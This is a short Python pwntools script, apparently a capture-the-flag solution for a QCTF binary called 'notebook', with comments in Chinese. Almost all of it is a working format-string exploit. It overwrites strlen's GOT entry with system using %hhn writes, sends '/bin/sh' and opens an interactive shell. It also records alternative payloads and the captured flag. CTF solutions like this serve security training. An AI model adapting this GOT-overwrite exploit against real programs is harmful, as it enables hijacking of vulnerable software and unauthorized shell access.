#encoding:utf-8
from pwn import *

# 更正思路,修改strlen函数got表->system，输入/bin/sh，直接调用
# 0x0804A038 -> 080485C0
# payload1 = p32(0x0804A03A)+"%%14$hhn%%4c%%20$hhn"+p32(0x0804A03B)+"22%%119c%%25$hhn"+p32(0x0804A039)+"%%55c%%30$hhn222"+p32(0x0804A038)+"%11c"
# payload2 = "2222"+"%%17$hhn"+p32(0x0804A03A)+"%%20$hhn"+p32(0x0804A03B)+"%%119c"+"22"+"%%25$hhn"+p32(0x0804A039)+"222"+"%%52c"+"%%30$hhn"+p32(0x0804A038)+"%10c"
# QCTF{f0rmat_s7r1ng_is_happy_}

def pwnIt():
	p = process("./notebook")
        gdb.attach(p)
	p.recvuntil("May I have your name?\n")
	payload = p32(0x0804A03A)+"%%14$hhn%%4c%%20$hhn"+p32(0x0804A03B)+"22%%119c%%25$hhn"+p32(0x0804A039)+"%%55c%%30$hhn222"+p32(0x0804A038)+"%11c"
        p.sendline(payload)
	p.recvuntil("on the notebook?\n")
	p.sendline("/bin/sh\x00")
	p.interactive()


if __name__=="__main__":
	pwnIt()
